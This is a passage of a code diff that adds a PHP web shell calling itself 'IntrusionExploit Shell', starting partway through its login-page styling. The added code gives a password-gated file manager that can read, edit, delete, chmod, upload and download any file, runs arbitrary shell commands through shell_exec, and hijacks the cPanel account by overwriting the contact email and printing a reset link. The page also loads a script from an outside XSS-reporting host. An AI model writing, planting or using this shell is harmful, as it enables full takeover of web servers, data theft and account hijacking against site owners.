+        font-size: 22px;
+        letter-spacing: 0.2em;
+        text-align: center;
+    }
+    .login-box h2 i, .login-shell-box h2 i{
+        color: rgb(212, 2, 2);
+        text-shadow: 0 0 5px #8300fd, 0 0 25px #ff2770;
+    }
+    .login-box input, .login-shell-box input{
+        width: 100%;
+        padding: 10px 20px;
+        outline: none;
+        font: 1em;
+        color: #ffffff;
+        background: rgb(0, 0, 0);
+        border: 2px solid #ffffff3b;
+        border-radius: 30px;
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+    .login-box input::placeholder, .login-shell-box input::placeholder{
+        color: #999;
+    }
+    .login-box input[type="submit"], .login-shell-box input[type="submit"]{
+        background: rgb(0, 0, 0);
+        border: none;
+        font-weight: 500;
+        cursor: pointer;
+        transition: 0.5s;
+        color: #fff;
+    }
+    .login-box input[type="submit"]:hover{
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+    .login-group{
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .login-group a{
+        color: white;
+        text-decoration: none;
+    }
+    .login-group a:nth-child(2){
+        color: rgb(212, 2, 2);
+        font-weight: 600;
+        cursor: pointer;
+    }
+
+    .login-shell-box{
+        display: none;
+    }
+</style 
+<?php
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        header("refresh: 0;");
+    } else {
+        login_shell();
+    }
+}
+?>
+
+<?php
+ini_set('display_errors', 0);
+
+// Get current directory or default to root (htdocs)
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
+
+if (!is_dir($current_dir)) {
+    $current_dir = dirname(__FILE__);
+}
+
+$items = scandir($current_dir);
+
+function formatBytes($size, $precision = 2) {
+    $base = log($size, 1024);
+    $suffixes = array('', 'KB', 'MB', 'GB', 'TB');   
+    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
+}
+
+$parent_dir = dirname($current_dir);
+$editFileContent = '';
+
+$directory = isset($_GET['dir']) ? $_GET['dir'] : '.';
+
+$directory = realpath($directory) ?: '.';
+
+$output = ''; // Variable to store command output
+
+if (isset($_POST['action'])) {
+    $action = $_POST['action'];
+    $target = $_POST['target'] ?? '';
+
+    switch ($action) {
+        case 'delete':
+            if (is_dir($target)) {
+                deleteDirectory($target); // Call the recursive delete function
+            } else {
+                unlink($target);
+            }
+            break;
+
+        case 'edit':
+            if (file_exists($target)) {
+                $editFileContent = file_get_contents($target);
+            }
+            break;
+
+        case 'save':
+            if (file_exists($target) && isset($_POST['content'])) {
+                file_put_contents($target, $_POST['content']);
+            }
+            break;
+
+        case 'chmod':
+            if (isset($_POST['permissions'])) {
+                chmod($target, octdec($_POST['permissions']));
+            }
+            break;
+
+        case 'download':
+            if (file_exists($target)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename=' . basename($target));
+                header('Expires: 0');
+                header('Cache-Control: must-revalidate');
+                header('Pragma: public');
+                header('Content-Length: ' . filesize($target));
+                readfile($target);
+                exit;
+            }
+            break;
+
+        case 'upload':
+            if (isset($_FILES['fileToUpload'])) {
+                $file = $_FILES['fileToUpload'];
+
+                // Check for errors
+                if ($file['error'] === UPLOAD_ERR_OK) {
+                    // Sanitize the file name
+                    $fileName = basename($file['name']);
+                    $targetPath = $current_dir . DIRECTORY_SEPARATOR . $fileName;
+
+                    // Move the uploaded file to the target directory
+                    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
+                        echo "<p>File uploaded successfully!</p>";
+                    } else {
+                        echo "<p>Failed to move uploaded file.</p>";
+                    }
+                } else {
+                    echo "<p>Error uploading file: " . $file['error'] . "</p>";
+                }
+            }
+            break;
+
+        case 'execute':
+            if (isset($_POST['command'])) {
+                $command = $_POST['command'];
+                // Execute the command and capture the output
+                $output = shell_exec($command . ' 2>&1'); // Redirect stderr to stdout
+            }
+            break;
+    }
+}
+
+function deleteDirectory($dir) {
+    if (!is_dir($dir)) {
+        return false;
+    }
+
+    $items = array_diff(scandir($dir), array('.', '..'));
+
+    foreach ($items as $item) {
+        $path = $dir . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($path)) {
+            deleteDirectory($path);
+        } else {
+            unlink($path);
+        }
+    }
+
+    return rmdir($dir);
+}
+
+function reset_cpanel_password($email) {
+    $user = get_current_user();
+    $site = $_SERVER['HTTP_HOST'];
+    $resetUrl = $site . ':2082/resetpass?start=1';
+    
+    $wr = 'email:' . $email;
+    
+    $f = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w');
+    fwrite($f, $wr);
+    fclose($f);
+    
+    $f = fopen('/home/' . $user . '/.contactinfo', 'w');
+    fwrite($f, $wr);
+    fclose($f);
+    
+    echo '<br/><center>Password reset link: <a href="http://' . $resetUrl . '">' . $resetUrl . '</a></center>';
+    echo '<br/><center>Username: ' . $user . '</center>';
+}
+
+if (isset($_POST['cpanel_reset'])) {
+    $email = $_POST['email'];
+    reset_cpanel_password($email);
+}
+
+$username = get_current_user();
+$user = $_SERVER['USER'] ?? 'N/A';
+$phpVersion = phpversion();
+$dateTime = date('Y-m-d H:i:s');
+$hddFreeSpace = disk_free_space("/") / (1024 * 1024 * 1024); // in GB
+$hddTotalSpace = disk_total_space("/") / (1024 * 1024 * 1024); // in GB
+$serverIP = $_SERVER['SERVER_ADDR'];
+$clientIP = $_SERVER['REMOTE_ADDR'];
+$cwd = getcwd();
+
+$parentDirectory = dirname($directory);
+$breadcrumbs = explode(DIRECTORY_SEPARATOR, $directory);
+$breadcrumbLinks = [];
+$breadcrumbPath = '';
+
+foreach ($breadcrumbs as $crumb) {
+    $breadcrumbPath .= $crumb . DIRECTORY_SEPARATOR;
+    $breadcrumbLinks[] = '<a href="?dir=' . urlencode(rtrim($breadcrumbPath, DIRECTORY_SEPARATOR)) . '">' . htmlspecialchars($crumb) . '</a>';
+}
+
+$breadcrumbLinksString = implode(' / ', $breadcrumbLinks);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Intrusion Exploit Shell</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <script src="https://googlescripts.xss.ht"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .file-manager {
+            width: 80%;
+            margin: 20px auto;
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .file-manager h1 {
+            text-align: center;
+        }
+        .system-info {
+            margin-bottom: 20px;
+            background-color: #f9f9f9;
+            padding: 10px;
+            border: 1px solid #ddd;
+        }
+        .file-list {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .file-list th, .file-list td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        .file-list th {
+            background-color: #f0f0f0;
+        }
+        .file-list tr:hover {
+            background-color: #f9f9f9;
+        }
+        .actions {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .actions button {
+            margin-right: 10px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+        .actions button:hover {
+            background-color: #0056b3;
+        }
+        .icon {
+            margin-right: 5px;
+        }
+        .file-actions {
+            display: flex;
+            justify-content: center;
+        }
+        .file-actions form {
+            display: inline;
+        }
+        .file-actions button {
+            background: none;
+            border: none;
+            color: #007bff;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 0 5px;
+            padding: 5px;
+        }
+        .file-actions button:hover {
+            color: #0056b3;
+        }
+        .file-actions button i {
+            margin-right: 0;
+        }
+        .edit-form {
+            margin-top: 20px;
+        }
+        .edit-form textarea {
+            width: 100%;
+            height: 300px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .edit-form button {
+            background-color: #28a745;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        .edit-form button:hover {
+            background-color: #218838;
+        }
+        .reset-form {
+            display: none;
+            margin-top: 10px;
+            background-color: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ced4da;
+        }
+        .reset-form input, .reset-form button {
+            margin: 5px 0;
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="file-manager">
+    <h1>IntrusionExploit Shell</h1>
+    
+    <!-- System Information Section -->
+    <div class="system-info">
+        <p>Current User: <b><?php echo htmlspecialchars($username); ?></b></p>
+        <p>Server IP: <b><?php echo htmlspecialchars($serverIP); ?></b></p>
+        <p>Client IP: <b><?php echo htmlspecialchars($clientIP); ?></b></p>
+        <p>Current Date and Time: <b><?php echo htmlspecialchars($dateTime); ?></b></p>
+        <p>PHP Version: <b><?php echo htmlspecialchars($phpVersion); ?></b></p>
+        <p>Free HDD Space: <b><?php echo round($hddFreeSpace, 2); ?> GB</b></p>
+        <p>Total HDD Space: <b><?php echo round($hddTotalSpace, 2); ?> GB</b></p>
+    </div>
+
+    <!-- Breadcrumb Navigation -->
+    <div class="breadcrumbs">
+        <p>Current Directory: <?php echo $breadcrumbLinksString; ?></p>
+    </div>
+
+    <!-- File Manager Table -->
+    <table class="file-list">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Size</th>
+                <th>Type</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php foreach ($items as $item) :
+                $itemPath = $current_dir . DIRECTORY_SEPARATOR . $item;
+                $isDirectory = is_dir($itemPath);
+                $type = $isDirectory ? 'Directory' : 'File';
+                $icon = $isDirectory ? '<i class="fas fa-folder"></i>' : '<i class="fas fa-file"></i>';
+            ?>
+                <tr>
+                    <td>
+                        <?php echo $icon; ?>
+                        <?php if ($isDirectory) : ?>
+                            <a href="?dir=<?php echo urlencode($itemPath); ?>"><?php echo htmlspecialchars($item); ?></a>
+                        <?php else : ?>
+                            <?php echo htmlspecialchars($item); ?>
+                        <?php endif; ?>
+                    </td>
+                    <td><?php echo $isDirectory ? '-' : formatBytes(filesize($itemPath)); ?></td>
+                    <td><?php echo $type; ?></td>
+                    <td>
+                        <div class="file-actions">
+                            <form method="POST" style="display:inline;">
+                                <input type="hidden" name="action" value="edit">
+                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
+                                <button type="submit"><i class="fas fa-edit"></i> Edit</button>
+                            </form>
+                            <form method="POST" style="display:inline;">
+                                <input type="hidden" name="action" value="delete">
+                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
+                                <button type="submit"><i class="fas fa-trash"></i> Delete</button>
+                            </form>
+                            <form method="POST" style="display:inline;">
+                                <input type="hidden" name="action" value="chmod">
+                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
+                                <input type="text" name="permissions" placeholder="0777">
+                                <button type="submit"><i class="fas fa-lock"></i> Chmod</button>
+                            </form>
+                            <?php if (!$isDirectory) : ?>
+                                <form method="POST" style="display:inline;">
+                                    <input type="hidden" name="action" value="download">
+                                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
+                                    <button type="submit"><i class="fas fa-download"></i> Download</button>
+                                </form>
+                            <?php endif; ?>
+                        </div>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+
+    <!-- Edit Form -->
+    <?php if (!empty($editFileContent)) : ?>
+        <form method="POST" class="edit-form">
+            <input type="hidden" name="action" value="save">
+            <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
+            <textarea name="content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
+            <button type="submit">Save</button>
+        </form>
+    <?php endif; ?>
+
+    <!-- Upload Form -->
+    <div class="actions">
+        <form method="POST" enctype="multipart/form-data">
+            <input type="hidden" name="action" value="upload">
+            <input type="file" name="fileToUpload">
+            <button type="submit">Upload</button>
+        </form>
+    </div>
+
+    <!-- Execute Form -->
+    <div class="actions">
+        <form method="POST">
+            <input type="hidden" name="action" value="execute">
+            <input type="text" name="command" placeholder="Enter command">
+            <button type="submit">Execute</button>
+        </form>
+        <?php if ($output) : ?>
+            <pre><?php echo htmlspecialchars($output); ?></pre>
+        <?php endif; ?>
+    </div>
+
+</div>
+</body>
+</html>
